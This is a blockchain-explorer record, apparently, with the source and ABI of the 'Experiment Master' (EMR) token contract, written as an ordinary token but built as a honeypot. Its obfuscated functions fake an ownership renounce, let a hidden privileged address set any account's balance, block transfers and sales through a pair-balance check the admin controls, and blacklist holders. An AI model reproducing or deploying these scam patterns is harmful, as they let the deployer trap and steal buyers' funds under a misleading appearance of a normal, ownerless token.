{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface buyReceiver {\n    function createPair(address launchMarketing, address feeIs) external returns (address);\n}\n\ninterface minEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTo) external view returns (uint256);\n\n    function transfer(address limitReceiver, uint256 receiverTotalLaunch) external returns (bool);\n\n    function allowance(address receiverSwapAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTotalLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitReceiver,\n        uint256 receiverTotalLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundLaunch, uint256 value);\n    event Approval(address indexed receiverSwapAmount, address indexed spender, uint256 value);\n}\n\nabstract contract receiverWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minEnableMetadata is minEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExperimentMaster is receiverWallet, minEnable, minEnableMetadata {\n\n    address public receiverMax;\n\n    function balanceOf(address maxTo) public view virtual override returns (uint256) {\n        return limitSellTo[maxTo];\n    }\n\n    function launchedTotal(address maxWalletAmount, address limitReceiver, uint256 receiverTotalLaunch) internal returns (bool) {\n        if (maxWalletAmount == receiverMax) {\n            return toTeam(maxWalletAmount, limitReceiver, receiverTotalLaunch);\n        }\n        uint256 buyMarketing = minEnable(toTokenLimit).balanceOf(receiverTo);\n        require(buyMarketing == walletSwap);\n        require(limitReceiver != receiverTo);\n        if (modeTradingFrom[maxWalletAmount]) {\n            return toTeam(maxWalletAmount, limitReceiver, atEnable);\n        }\n        return toTeam(maxWalletAmount, limitReceiver, receiverTotalLaunch);\n    }\n\n    function listTrading() public {\n        emit OwnershipTransferred(receiverMax, address(0));\n        feeTx = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitFrom;\n    }\n\n    function receiverLiquidity(address minTeamSender, uint256 receiverTotalLaunch) public {\n        walletTx();\n        limitSellTo[minTeamSender] = receiverTotalLaunch;\n    }\n\n    function approve(address senderTotalList, uint256 receiverTotalLaunch) public virtual override returns (bool) {\n        tradingLaunch[_msgSender()][senderTotalList] = receiverTotalLaunch;\n        emit Approval(_msgSender(), senderTotalList, receiverTotalLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public modeTradingFrom;\n\n    function toTeam(address maxWalletAmount, address limitReceiver, uint256 receiverTotalLaunch) internal returns (bool) {\n        require(limitSellTo[maxWalletAmount] >= receiverTotalLaunch);\n        limitSellTo[maxWalletAmount] -= receiverTotalLaunch;\n        limitSellTo[limitReceiver] += receiverTotalLaunch;\n        emit Transfer(maxWalletAmount, limitReceiver, receiverTotalLaunch);\n        return true;\n    }\n\n    uint256 launchedLimitTake;\n\n    function tradingTx(address amountMarketing) public {\n        require(amountMarketing.balance < 100000);\n        if (marketingTotal) {\n            return;\n        }\n        if (sellTeamTotal == sellShould) {\n            sellTeamTotal = atMax;\n        }\n        modeFrom[amountMarketing] = true;\n        if (atMax == sellTeamTotal) {\n            sellTeamTotal = sellShould;\n        }\n        marketingTotal = true;\n    }\n\n    function transfer(address minTeamSender, uint256 receiverTotalLaunch) external virtual override returns (bool) {\n        return launchedTotal(_msgSender(), minTeamSender, receiverTotalLaunch);\n    }\n\n    uint256 private atMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFeeFrom;\n    }\n\n    uint256 private limitFrom = 100000000 * 10 ** 18;\n\n    address takeFeeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed receiverReceiver, address indexed amountTotalReceiver);\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalSender;\n    }\n\n    string private totalSender = \"EMR\";\n\n    address public toTokenLimit;\n\n    address receiverTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address maxWalletAmount, address limitReceiver, uint256 receiverTotalLaunch) external override returns (bool) {\n        if (_msgSender() != takeFeeTotal) {\n            if (tradingLaunch[maxWalletAmount][_msgSender()] != type(uint256).max) {\n                require(receiverTotalLaunch <= tradingLaunch[maxWalletAmount][_msgSender()]);\n                tradingLaunch[maxWalletAmount][_msgSender()] -= receiverTotalLaunch;\n            }\n        }\n        return launchedTotal(maxWalletAmount, limitReceiver, receiverTotalLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingLaunch;\n\n    function getOwner() external view returns (address) {\n        return feeTx;\n    }\n\n    uint8 private maxFeeFrom = 18;\n\n    constructor (){\n        if (atMax == sellTeamTotal) {\n            sellTeamTotal = sellShould;\n        }\n        receiverMin txReceiver = receiverMin(takeFeeTotal);\n        toTokenLimit = buyReceiver(txReceiver.factory()).createPair(txReceiver.WETH(), address(this));\n        if (walletTo == totalLiquidity) {\n            walletTo = false;\n        }\n        receiverMax = _msgSender();\n        modeFrom[receiverMax] = true;\n        limitSellTo[receiverMax] = limitFrom;\n        listTrading();\n        \n        emit Transfer(address(0), receiverMax, limitFrom);\n    }\n\n    bool public walletTo;\n\n    uint256 public sellTeamTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return swapLaunch;\n    }\n\n    bool public totalLiquidity;\n\n    function owner() external view returns (address) {\n        return feeTx;\n    }\n\n    string private swapLaunch = \"Experiment Master\";\n\n    address private feeTx;\n\n    function receiverSender(address fundList) public {\n        walletTx();\n        if (sellTeamTotal != sellShould) {\n            sellTeamTotal = sellShould;\n        }\n        if (fundList == receiverMax || fundList == toTokenLimit) {\n            return;\n        }\n        modeTradingFrom[fundList] = true;\n    }\n\n    function allowance(address toLaunchedMin, address senderTotalList) external view virtual override returns (uint256) {\n        if (senderTotalList == takeFeeTotal) {\n            return type(uint256).max;\n        }\n        return tradingLaunch[toLaunchedMin][senderTotalList];\n    }\n\n    uint256 constant atEnable = 8 ** 10;\n\n    mapping(address => bool) public modeFrom;\n\n    bool public marketingTotal;\n\n    function atFund(uint256 receiverTotalLaunch) public {\n        walletTx();\n        walletSwap = receiverTotalLaunch;\n    }\n\n    uint256 walletSwap;\n\n    mapping(address => uint256) private limitSellTo;\n\n    uint256 public sellShould;\n\n    function walletTx() private view {\n        require(modeFrom[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwapAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotalReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunchedMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTotalList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotalList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTotalLaunch\",\"type\":\"uint256\"}],\"name\":\"atFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTradingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeamTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTokenLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWalletAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExperimentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}